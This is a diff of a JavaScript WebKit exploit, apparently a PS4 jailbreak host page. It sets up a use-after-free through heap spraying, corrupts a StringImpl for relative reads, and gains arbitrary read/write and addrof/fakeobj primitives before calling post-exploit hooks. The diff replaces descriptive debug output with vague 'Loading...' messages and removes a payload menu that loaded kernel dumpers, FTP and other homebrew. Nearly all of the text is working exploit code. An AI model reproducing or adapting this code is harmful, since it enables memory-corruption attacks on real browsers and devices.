@@ -51,14 +51,14 @@ function setupRW() {
 	for (let i = 0; i < g_arr_ab_3.length; i++) {
 		if (g_arr_ab_3[i].length > 0xff) {
 			g_relative_rw = g_arr_ab_3[i];
-			debug_log("-> Succesfully got a relative R/W");
+			//debug_log("[80%] Loading...");
 			break;
 		}
 	}
 	if (g_relative_rw === null)
 		die("[!] Failed to setup a relative R/W primitive");
 
-	debug_log("-> Setting up arbitrary R/W");
+	//debug_log("[+] Setting up arbitrary R/W");
 
 	/* Retrieving the ArrayBuffer address using the relative read */
 	let diff = g_jsview_leak.sub(g_timer_leak).low32() - LENGTH_STRINGIMPL + 1;
@@ -91,14 +91,14 @@ function setupRW() {
 	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH + 2] = 0xff;
 	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH + 3] = 0xff;
 
-	debug_log("-> Testing arbitrary R/W");
+	//debug_log("[90%] Loading...");
 
 	let saved_vtable = read64(guess_htmltextarea_addr);
 	write64(guess_htmltextarea_addr, new Int64("0x4141414141414141"));
 	if (!read64(guess_htmltextarea_addr).equals("0x4141414141414141"))
 		die("[!] Failed to setup arbitrary R/W primitive");
 
-	debug_log("-> Succesfully got arbitrary R/W!");
+	//debug_log("[99%] Loading ...");
 
 	/* Restore the overidden vtable pointer */
 	write64(guess_htmltextarea_addr, saved_vtable);
@@ -114,137 +114,12 @@ function setupRW() {
 	g_jsview_butterfly = new Int64(bf);
 	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))
 		die("[!] Failed to setup addrof/fakeobj primitives");
-	debug_log("Webkit Complete..Running Exploit !!");
+	debug_log("Exploit successfully loaded");
 
 	/* Getting code execution */
 	/* ... */
 	if(window.postExploit)
 		window.postExploit();
-
-}
-
-function toggle_payload(pld){
-	if(pld == "binloader"){
-		document.getElementById("progress").innerHTML="Awaiting Payload.. Send Payload to port 9020..";
-		preloadScripts(['preloader.js', 'loader.js']);
-	}else if(pld == "goldhen"){
-		document.getElementById("progress").innerHTML="Loading GoldHen.. Please wait..";
-		if(fw=="755"){
-			preloadScripts(['preloader.js', 'goldhen'+fw+'.js', 'loader.js']);
-		}else{
-			preloadScripts(['preloader'+fw+'.js', 'goldhen'+fw+'.js', 'loader.js']);	
-		}
-	}else if(pld == "ftp"){
-		setTimeout(function(){document.getElementById("progress").innerHTML="FTP Loaded.. Access at port 1337.."; }, 7000);
-		preloadScripts(['preloader.js', 'ftp.js', 'loader.js']);
-	}else if(pld == "app2usb"){
-		document.getElementById("progress").innerHTML="Loading App-2-Usb.. Please wait..";
-		preloadScripts(['preloader.js', 'app2usb.js', 'loader.js']);
-	}else if(pld == "webrte"){
-		document.getElementById("progress").innerHTML="Loading WebRTE.. Please wait..";
-		preloadScripts(['preloader.js', 'webrte755.js', 'loader.js']);
-	}else if(pld == "disableupdates"){
-		document.getElementById("progress").innerHTML="Loading Disable Updates.. Please wait..";
-		preloadScripts(['preloader.js', 'disableupdates.js', 'loader.js']);
-	}else if(pld == "enableupdates"){
-		document.getElementById("progress").innerHTML="Loading Enable Updates.. Please wait..";
-		preloadScripts(['preloader.js', 'enableupdates.js', 'loader.js']);
-	}else if(pld == "backup"){
-		document.getElementById("progress").innerHTML="Loading  db backup.. Please wait..";
-		preloadScripts(['preloader.js', 'backup.js', 'loader.js']);
-	}else if(pld == "restore"){
-		document.getElementById("progress").innerHTML="Loading db restore.. Please wait..";
-		preloadScripts(['preloader.js', 'restore.js', 'loader.js']);
-	}else if(pld == "todex"){
-		document.getElementById("progress").innerHTML="Loading Todex.. Please wait..";
-		preloadScripts(['preloader.js', 'todex.js', 'loader.js']);
-	}else if(pld == "dumper"){
-		document.getElementById("progress").innerHTML="Loading Dumper.. Please wait..";
-		preloadScripts(['preloader.js', 'dumper.js', 'loader.js']);
-	}else if(pld == "kerneldumper"){
-		document.getElementById("progress").innerHTML="Loading Kernel Dumper.. Please wait..";
-		preloadScripts(['preloader.js', 'kerneldumper.js', 'loader.js']);
-	}else if(pld == "kernelclock"){
-		document.getElementById("progress").innerHTML="Loading Kernel Clock.. Please wait..";
-		preloadScripts(['preloader.js', 'kernelclock.js', 'loader.js']);
-    }else if(pld == "enablebrowser"){
-		document.getElementById("progress").innerHTML="Loading Enable Browser.. Please wait..";
-		preloadScripts(['preloader.js', 'enablebrowser.js', 'loader.js']);
-	}else if(pld == "historyblocker"){
-		document.getElementById("progress").innerHTML="Loading History Blocker.. Please wait..";
-		preloadScripts(['preloader.js', 'historyblocker.js', 'loader.js']);
-	}else if(pld == "Linux1gb"){
-		document.getElementById("progress").innerHTML="Loading Linux Loader 1gb.. Please wait..";
-		preloadScripts(['preloader.js', 'Linux1gb.js', 'loader.js']);
-	}else if(pld == "Linux3gb"){
-		document.getElementById("progress").innerHTML="Loading Linux Loader 3gb.. Please wait..";
-		preloadScripts(['preloader.js', 'Linux3gb.js', 'loader.js']);
-	}else if(pld == "gtava1"){
-		document.getElementById("progress").innerHTML="Loading GTAV ArabicGuy 1.00.. Please wait..";
-		preloadScripts(['preloader.js', 'gtava1.js', 'loader.js']);
-	}else if(pld == "gtava2"){
-		document.getElementById("progress").innerHTML="Loading GTAV ArabicGuy 1.27.. Please wait..";
-		preloadScripts(['preloader.js', 'gtava2.js', 'loader.js']);
-	}else if(pld == "gtava3"){
-		document.getElementById("progress").innerHTML="Loading GTAV ArabicGuy 1.32.. Please wait..";
-		preloadScripts(['preloader.js', 'gtava3.js', 'loader.js']);
-	}else if(pld == "gtavn1"){
-		document.getElementById("progress").innerHTML="Loading GTAV Native Caller 1.00.. Please wait..";
-		preloadScripts(['preloader.js', 'gtavn1.js', 'loader.js']);
-	}else if(pld == "gtavn2"){
-		document.getElementById("progress").innerHTML="Loading GTAV Native Caller 1.27.. Please wait..";
-		preloadScripts(['preloader.js', 'gtavn2.js', 'loader.js']);
-	}else if(pld == "gtavn3"){
-		document.getElementById("progress").innerHTML="Loading GTAV Native Caller 1.32.. Please wait..";
-		preloadScripts(['preloader.js', 'gtavn3.js', 'loader.js']);
-	}else if(pld == "gtavl"){
-		document.getElementById("progress").innerHTML="Loading GTAV Lamance 1.32.. Please wait..";
-		preloadScripts(['preloader.js', 'gtavl.js', 'loader.js']);
-	}else if(pld == "fancontrol50"){
-		document.getElementById("progress").innerHTML="Loading Fan Control 50c.. Please wait..";
-		preloadScripts(['preloader.js', 'fancontrol50.js', 'loader.js']);
-	}else if(pld == "fancontrol55"){
-		document.getElementById("progress").innerHTML="Loading Fan Control 55c.. Please wait..";
-		preloadScripts(['preloader.js', 'fancontrol55.js', 'loader.js']);	
-	}else if(pld == "fancontrol60"){
-		document.getElementById("progress").innerHTML="Loading Fan Control 60c.. Please wait..";
-		preloadScripts(['preloader.js', 'fancontrol60.js', 'loader.js']);
-	}else if(pld == "fancontrol65"){
-		document.getElementById("progress").innerHTML="Loading Fan Control 65c.. Please wait..";
-		preloadScripts(['preloader.js', 'fancontrol65.js', 'loader.js']);
-	}else if(pld == "fancontrol70"){
-		document.getElementById("progress").innerHTML="Loading Fan Control 70c.. Please wait..";
-		preloadScripts(['preloader.js', 'fancontrol70.js', 'loader.js']);
-	}else if(pld == "fancontrol75"){
-		document.getElementById("progress").innerHTML="Loading Fan Control 75c.. Please wait..";
-		preloadScripts(['preloader.js', 'fancontrol75.js', 'loader.js']);
-	}else if(pld == "fancontrol80"){
-		document.getElementById("progress").innerHTML="Loading Fan Control 80c.. Please wait..";
-		preloadScripts(['preloader.js', 'fancontrol80.js', 'loader.js']);
-	}else if(pld == "fancontrol85"){
-		document.getElementById("progress").innerHTML="Loading Fan Control 85c.. Please wait..";
-		preloadScripts(['preloader.js', 'fancontrol85.js', 'loader.js']);
-	}else if(pld == "fancontrol90"){
-		document.getElementById("progress").innerHTML="Loading Fan Control 90c.. Please wait..";
-		preloadScripts(['preloader.js', 'fancontrol90.js', 'loader.js']);	
-	}
-	else if(pld == "ps4debug"){
-		document.getElementById("progress").innerHTML="Loading Ps4 Debug.. Please wait..";
-		preloadScripts(['preloader.js', 'ps4debug.js', 'loader.js']);
-	}
-	if(window.postPayload)
-		window.postPayload();
-	payload_finished(pld);
-	
-}
-
-function payload_finished(payload)
-{
-	if(payload == "binloader"){
-		setTimeout(function(){document.getElementById("progress").innerHTML="Awaiting Payload!! Send Payload To Port 9021"; }, 7000);
-	} else if(payload != "Jailbreak"){
-		setTimeout(function(){document.getElementById("progress").innerHTML="Payload Loaded Succesfully !!"; }, 7000);
-	}
 }
 
 function read(addr, length) {
@@ -314,14 +189,14 @@ function confuseTargetObjRound2() {
 
 /* Executed after deleteBubbleTree */
 function leakJSC() {
-	debug_log("-> Looking for the smashed StringImpl...");
+	//debug_log("[+] Looking for the smashed StringImpl...");
 
 	var arr_str = Object.getOwnPropertyNames(g_obj_str);
 
 	/* Looking for the smashed string */
 	for (let i = arr_str.length - 1; i > 0; i--) {
 		if (arr_str[i].length > 0xff) {
-			debug_log("-> StringImpl corrupted successfully");
+			//debug_log("[40%] Loading...");
 			g_relative_read = arr_str[i];
 			g_obj_str = null;
 			break;
@@ -330,7 +205,7 @@ function leakJSC() {
 	if (g_relative_read === null)
 		die("[!] Failed to setup a relative read primitive");
 
-	debug_log("-> Got a relative read");
+	//debug_log("[+] Got a relative read");
 
         var tmp_spray = {};
         for(var i = 0; i < 100000; i++)
@@ -407,7 +282,7 @@ function leakJSC() {
 	 * /!\ 
 	 */
 
-	debug_log("-> JSArrayBufferView: " + g_jsview_leak);
+	//debug_log("[60%] Loading... ");
 
 	/* Run the exploit again */
 	prepareUAF();
@@ -433,7 +308,7 @@ function confuseTargetObjRound1() {
 	 * The timeout must be > 5s because deleteBubbleTree is scheduled to run in
 	 * the next 5s
 	 */
-	setTimeout(function(){leakJSC();}, 6000);
+	setTimeout(leakJSC, 6000);
 }
 
 function handle2() {
@@ -481,15 +356,15 @@ function reuseTargetObj() {
 }
 
 function dumpTargetObj() {
-	debug_log("-> m_timer: " + g_timer_leak);
-	debug_log("-> m_messageHeading: " + g_message_heading_leak);
-	debug_log("-> m_messageBody: " + g_message_body_leak);
+	//debug_log("[10%] Loading... ");
+	//debug_log("[+] m_messageHeading: " + g_message_heading_leak);
+	//debug_log("[20%] Loading... ");
 }
 
 function findTargetObj() {
 	for (let i = 0; i < g_arr_ab_1.length; i++) {
 		if (!Int64.fromDouble(g_arr_ab_1[i][2]).equals(Int64.Zero)) {
-			debug_log("-> Found fake ValidationMessage");
+			//debug_log("[+] Found fake ValidationMessage");
 
 			if (g_round === 2) {
 				g_timer_leak = Int64.fromDouble(g_arr_ab_1[i][2]);
@@ -536,7 +411,7 @@ function prepareUAF() {
 
 /* HTMLElement spray */
 function sprayHTMLTextArea() {
-	debug_log("-> Spraying HTMLTextareaElement ...");
+	debug_log("Please wait for exploit loading ...");
 
 	let textarea_div_elem = window.xyu = document.createElement("div");
 	document.body.appendChild(textarea_div_elem);
@@ -565,15 +440,13 @@ function sprayStringImpl(start, end) {
 }
 
 function go() {
-	if(localStorage.isPrbCached){
-		/* Init spray */
-		sprayHTMLTextArea();
+	/* Init spray */
+	sprayHTMLTextArea();
 
-		if(window.midExploit)
-			window.midExploit();
+	if(window.midExploit)
+		window.midExploit();
 
-		g_input = input1;
-		/* Shape heap layout for obj. reuse */
-		prepareUAF();
-	}
+	g_input = input1;
+	/* Shape heap layout for obj. reuse */
+	prepareUAF();
 }
